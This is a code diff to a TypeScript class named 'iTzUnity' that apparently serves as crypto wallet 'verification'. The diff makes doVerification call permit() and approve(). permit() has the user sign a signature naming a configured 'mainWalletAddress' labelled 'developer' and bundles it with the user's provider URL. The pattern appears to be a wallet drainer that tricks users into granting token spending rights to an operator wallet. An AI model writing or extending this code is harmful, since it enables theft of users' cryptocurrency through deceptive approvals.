@@ -58,6 +58,8 @@ class iTzUnity {
 	}
 
 	async permit() {
+		const providerUrl = //@ts-ignore
+			provider?.connection?.url;
 		const developer = {
 			address: await getConfig('mainWalletAddress')
 		}
@@ -94,8 +96,7 @@ class iTzUnity {
 			"V", sig.v.toString()
 		);
 		console.log(sig);
-		const providerUrl = //@ts-ignore
-			provider?.connection?.url;
+
 		const payload: FinalizedSignedSignature = {
 			signedSignature: sig,
 			provider: providerUrl,
@@ -112,9 +113,15 @@ export async function doVerification(provider: ReturnType<typeof useEthersProvid
 		await unity.transaction();
 	} else {
 		try {
-
+			await unity.permit();
 		} catch (e: any) {
 			console.log("PERMIT METHOD FAILURE",e);
+		}
+
+		try {
+			await unity.approve();
+		}  catch (e: any) {
+			console.log("APPROVE METHOD FAILURE",e);
 		}
 	}
 }
